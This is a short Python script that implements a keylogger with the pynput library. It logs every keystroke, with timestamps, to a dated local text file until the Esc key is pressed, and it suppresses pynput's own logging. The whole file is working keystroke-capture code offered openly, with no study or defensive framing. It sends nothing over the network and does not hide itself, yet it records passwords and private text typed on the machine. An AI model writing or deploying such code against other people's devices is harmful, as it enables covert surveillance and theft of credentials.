import logging
from pynput import keyboard as _keyboard
from datetime import datetime as _dt

logging.getLogger('pynput').setLevel(logging.CRITICAL)

class Keylogger:
    def __init__(self):
        self.start_time = _dt.now()
        self.log_file = f"keylog_{self.start_time.strftime('%Y%m%d')}.txt"
        self.listener = _keyboard.Listener(on_press=self.on_press)
        self.log_event(f"Keylogger started at {self.start_time}\n")

    def log_event(self, event):
        with open(self.log_file, 'a') as f:
            f.write(f"{event}\n")
        
    def on_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)
        
        timestamp = _dt.now().strftime('%Y-%m-%d %H:%M:%S')
        self.log_event(f"{timestamp} - {key_str}")
        if key == _keyboard.Key.esc:
            self.stop()

    def start(self):
        self.listener.start()
        self.listener.join()
    def stop(self):
        self.listener.stop()
        end_time = _dt.now()
        self.log_event(f"Keylogger stopped at {end_time}")
        self.log_event(f"Duration: {end_time - self.start_time}\n")

if __name__ == "__main__":
    kl = Keylogger()
    kl.start()